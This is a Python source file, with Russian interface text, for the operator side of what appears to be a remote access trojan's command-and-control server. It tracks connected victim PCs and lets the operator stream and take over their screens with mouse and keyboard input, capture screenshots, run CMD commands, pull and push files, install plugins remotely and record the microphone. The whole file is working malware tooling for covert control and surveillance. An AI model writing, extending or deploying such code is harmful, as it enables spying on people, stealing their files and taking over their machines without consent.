import os
import socket
import struct
import threading
import time
import cv2
import numpy as np

LISTEN_IP = "0.0.0.0"
PORT = 5000

clients = {}  
client_counter = 1
lock = threading.Lock()

current_stream_conn = None
last_frame_dims = (1, 1)
last_move_time = 0 


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        except Exception:
            return None
    return data


def receive_payload(sock):
    try:
        header = recv_exact(sock, 9)
        if not header:
            return False, b"Connection closed"

        status_byte = header[0]
        length = struct.unpack("!Q", header[1:9])[0]

        if length > 500 * 1024 * 1024:
            return False, b"Payload desync error"

        payload = recv_exact(sock, length)
        if payload is None:
            return False, b"Connection closed during payload read"

        success = (status_byte == 1)
        return success, payload
    except Exception as e:
        return False, str(e).encode("utf-8")


def send_payload(sock, status: int, payload: bytes):
    header = struct.pack("!BQ", status, len(payload))
    sock.sendall(header + payload)


def on_cv_mouse(event, x, y, flags, param):
    global current_stream_conn, last_frame_dims, last_move_time
    if not current_stream_conn:
        return

    w, h = last_frame_dims
    rx, ry = (x / w if w else 0), (y / h if h else 0)

    try:
        if event == cv2.EVENT_LBUTTONDOWN:
            current_stream_conn.sendall(f"CLICK:left:{rx:.4f}:{ry:.4f}\n".encode("utf-8"))
        elif event == cv2.EVENT_RBUTTONDOWN:
            current_stream_conn.sendall(f"CLICK:right:{rx:.4f}:{ry:.4f}\n".encode("utf-8"))
        elif event == cv2.EVENT_MOUSEMOVE and (flags & cv2.EVENT_FLAG_LBUTTON):
            current_time = time.time()
            if current_time - last_move_time > 0.03:
                current_stream_conn.sendall(f"MOVE:{rx:.4f}:{ry:.4f}\n".encode("utf-8"))
                last_move_time = current_time
    except Exception:
        pass


def start_screen_stream(conn, client_id, interactive=False):
    global current_stream_conn, last_frame_dims
    current_stream_conn = conn if interactive else None

    mode_str = "Interactive" if interactive else "View Only"
    window_name = f"Live Screen ({mode_str}) - Client #{client_id}"
    cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)

    if interactive:
        cv2.setMouseCallback(window_name, on_cv_mouse)
        print("\n[+] Запущен стрим С УПРАВЛЕНИЕМ.")
    else:
        print("\n[+] Запущен стрим БЕЗ УПРАВЛЕНИЯ.")
    print("[+] Нажимайте 'q' в окне видео для выхода.\n")

    try:
        while True:
            success, payload = receive_payload(conn)
            if not success:
                break

            image_np = np.frombuffer(payload, dtype=np.uint8)
            frame = cv2.imdecode(image_np, cv2.IMREAD_COLOR)

            if frame is not None:
                h, w, _ = frame.shape
                last_frame_dims = (w, h)
                cv2.imshow(window_name, frame)

            key = cv2.waitKey(1) & 0xFF
            if key != 255:
                if key == ord("q"):
                    conn.sendall(b"STOP_STREAM\n")
                    break

                if interactive:
                    if key == 13:      
                        conn.sendall(b"KEY:enter\n")
                    elif key == 8:     
                        conn.sendall(b"KEY:backspace\n")
                    elif key == 32:    
                        conn.sendall(b"KEY:space\n")
                    else:
                        try:
                            char = chr(key)
                            conn.sendall(f"KEY:{char}\n".encode("utf-8"))
                        except ValueError:
                            pass
    except Exception:
        pass
    finally:
        current_stream_conn = None
        cv2.destroyAllWindows()


def accept_connections(server_socket):
    global client_counter
    while True:
        try:
            conn, addr = server_socket.accept()
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            try:
                conn.settimeout(2.0)
                hostname_data = conn.recv(1024)
                conn.settimeout(None)
                hostname = hostname_data.decode("utf-8", errors="ignore").strip() if hostname_data else "Unknown-PC"
            except Exception:
                hostname = "Unknown-PC"

            with lock:
                clients[client_counter] = (conn, addr, hostname)
                print(f"\n[+] Новое подключение: Клиент #{client_counter} | ПК: {hostname} ({addr[0]}:{addr[1]})")
                client_counter += 1
        except Exception:
            break


def get_plugin_commands_help():
    """Динамически считывает команды и их справку из всех .plug файлов в папке plugins/"""
    plugin_commands = []
    server_plugins_dir = "plugins"
    if os.path.exists(server_plugins_dir):
        for filename in os.listdir(server_plugins_dir):
            if filename.endswith(".plug"):
                filepath = os.path.join(server_plugins_dir, filename)
                try:
                    with open(filepath, "r", encoding="utf-8") as f:
                        code_content = f.read()
                    namespace = {}
                    exec(code_content, namespace)
                    
                    # Пытаемся получить словарь с описаниями из get_help()
                    plugin_helps = {}
                    if "get_help" in namespace:
                        try:
                            plugin_helps = namespace["get_help"]()
                        except Exception:
                            pass

                    if "get_commands" in namespace:
                        cmds = namespace["get_commands"]()
                        for cmd_name in cmds.keys():
                            # Ищем описание в get_help() (проверяем точное совпадение или начало ключа)
                            desc = plugin_helps.get(cmd_name, None)
                            if not desc:
                                for h_key, h_desc in plugin_helps.items():
                                    if h_key.startswith(cmd_name):
                                        desc = h_key
                                        break
                            
                            # Если справки нет вообще, используем саму команду вместо "Без описания"
                            if not desc:
                                desc = cmd_name

                            plugin_commands.append(f"  {desc:<45} - (плагин {filename})")
                except Exception:
                    pass
    
    if not plugin_commands:
        return "  (нет загруженных плагинов или команд)"
    return "\n".join(plugin_commands)


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, PORT))
    server.listen(5)

    print(f"[*] Сервер запущен на {LISTEN_IP}:{PORT}")
    print("[*] Ожидание клиентов...\n")

    t = threading.Thread(target=accept_connections, args=(server,), daemon=True)
    t.start()

    current_target_id = None

    while True:
        try:
            prompt = f"Server (Client #{current_target_id})> " if current_target_id else "Server> "
            cmd_line = input(prompt).strip()

            if not cmd_line:
                continue

            parts = cmd_line.split(" ", 1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""

            if action == "list":
                with lock:
                    print("\n--- Подключенные клиенты ---")
                    for cid, (conn, addr, hname) in list(clients.items()):
                        print(f" ID: {cid} | ПК: {hname} | IP: {addr[0]}:{addr[1]}")
                    print("----------------------------\n")

            elif action == "help":
                plugins_help_text = get_plugin_commands_help()
                print(f"""
--- Справка по командам ---
list                      - Список клиентов
select <id>               - Выбрать клиента
back                      - В главное меню
exit                      - Выход

--- Команды управления плагинами и IP ---
plugin_list               - Сравнить плагины на клиенте/сервере и доустановить недостающие
plugin_reload             - Перезагрузить плагины на клиенте
ip_list                   - Список IP клиента
ip_add <ip>               - Добавить IP клиенту
ip_remove <ip/номер>      - Удалить IP у клиента

--- Команды для клиента ---
stream [fps] [q]          - Стрим экрана
stream_control [fps] [q]  - Стрим с управлением
shot                      - Скриншот
ls                        - Список дисков / папок
cd <путь / диск>          - Перемещение
cmd <команда>             - Выполнить CMD
download <путь>           - Скачать файл
upload <путь>             - Загрузить файл

--- Команды из плагинов ---
{plugins_help_text}
""")

            elif action == "select":
                if not arg.isdigit():
                    print("[-] Укажите корректный ID")
                    continue
                cid = int(arg)
                with lock:
                    if cid in clients:
                        current_target_id = cid
                        _, _, hname = clients[cid]
                        print(f"[+] Выбран клиент #{cid} (ПК: {hname})")
                    else:
                        print("[-] Клиент не найден.")

            elif action == "back":
                current_target_id = None

            elif action == "exit":
                print("[*] Выход...")
                break

            elif action in ["stream", "stream_control"]:
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue

                conn, _, _ = clients[current_target_id]
                opts = arg.split()
                fps = opts[0] if len(opts) > 0 and opts[0].isdigit() else "20"
                quality = opts[1] if len(opts) > 1 and opts[1].isdigit() else "35"

                interactive = (action == "stream_control")
                conn.sendall(f"{action} {fps} {quality}".encode("utf-8"))
                start_screen_stream(conn, current_target_id, interactive=interactive)

            elif action == "shot":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                conn, _, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                success, payload = receive_payload(conn)
                if success:
                    filename = f"screenshot_client_{current_target_id}.jpg"
                    with open(filename, "wb") as f:
                        f.write(payload)
                    print(f"[+] Скриншот сохранен как {filename}")
                else:
                    print(payload.decode("utf-8", errors="replace"))

            elif action == "download":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                conn, _, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                success, payload = receive_payload(conn)
                if success:
                    filename = os.path.basename(arg) if arg else "downloaded_file"
                    with open(filename, "wb") as f:
                        f.write(payload)
                    print(f"[+] Файл успешно скачан: {filename}")
                else:
                    print(f"[-] Ошибка: {payload.decode('utf-8', errors='replace')}")

            elif action == "upload":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                if not os.path.exists(arg) or not os.path.isfile(arg):
                    print("[-] Локальный файл не найден.")
                    continue
                
                conn, _, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                
                with open(arg, "rb") as f:
                    file_data = f.read()
                send_payload(conn, 1, file_data)
                
                success, payload = receive_payload(conn)
                print(payload.decode("utf-8", errors="replace"))

            elif action == "plugin_list":
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                
                server_plugins_dir = "plugins"
                if not os.path.exists(server_plugins_dir):
                    os.makedirs(server_plugins_dir)
                server_files = [f for f in os.listdir(server_plugins_dir) if f.endswith(".plug")]

                conn, _, _ = clients[current_target_id]
                conn.sendall(f"{action}".encode("utf-8"))
                success, payload = receive_payload(conn)
                
                if not success:
                    print(f"[-] Ошибка получения данных от клиента: {payload.decode('utf-8', errors='replace')}")
                    continue
                
                client_files_str = payload.decode("utf-8", errors="replace")
                client_files = [f.strip() for f in client_files_str.splitlines() if f.strip()]

                print("\n--- Сравнение плагинов ---")
                print(f"Сервер (папка plugins/): {server_files if server_files else '(пусто)'}")
                print(f"Клиент:                  {client_files if client_files else '(пусто)'}")
                print("--------------------------")

                missing_on_client = [f for f in server_files if f not in client_files]
                if missing_on_client:
                    for f_name in missing_on_client:
                        print(f"[-] Ошибка: Плагин '{f_name}' отсутствует на клиенте.")
                        choice = input(f"[?] Установить плагин '{f_name}' на клиент? (y/n): ").strip().lower()
                        if choice == 'y':
                            local_path = os.path.join(server_plugins_dir, f_name)
                            if os.path.exists(local_path):
                                target_remote_path = f"plugins/{f_name}"
                                
                                conn.sendall(f"upload {target_remote_path}".encode("utf-8"))
                                time.sleep(0.1)
                                
                                with open(local_path, "rb") as f_obj:
                                    file_data = f_obj.read()
                                
                                send_payload(conn, 1, file_data)
                                
                                up_success, up_payload = receive_payload(conn)
                                print(up_payload.decode("utf-8", errors="replace"))

                                conn.sendall(b"plugin_reload")
                                _, reload_payload = receive_payload(conn)
                                print(reload_payload.decode("utf-8", errors="replace"))
                            else:
                                print(f"[-] Локальный файл {local_path} не найден на сервере.")
                else:
                    print("[+] Все плагины с сервера присутствуют на клиенте.")

            else:
                if not current_target_id or current_target_id not in clients:
                    print("[-] Сначала выберите клиента через 'select <ID>'")
                    continue
                conn, _, _ = clients[current_target_id]
                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                success, payload = receive_payload(conn)

                if success and action == "mic_record" and len(payload) > 100:
                    filename = f"client_{current_target_id}_mic.wav"
                    with open(filename, "wb") as f:
                        f.write(payload)
                    print(f"[+] Аудиозапись сохранена на сервере как: {filename}")
                else:
                    print(payload.decode("utf-8", errors="replace"))

        except KeyboardInterrupt:
            print("\n[*] Выход...")
            break

    with lock:
        for cid, (conn, _, _) in clients.items():
            try:
                conn.close()
            except Exception:
                pass
    server.close()

if __name__ == "__main__":
    main()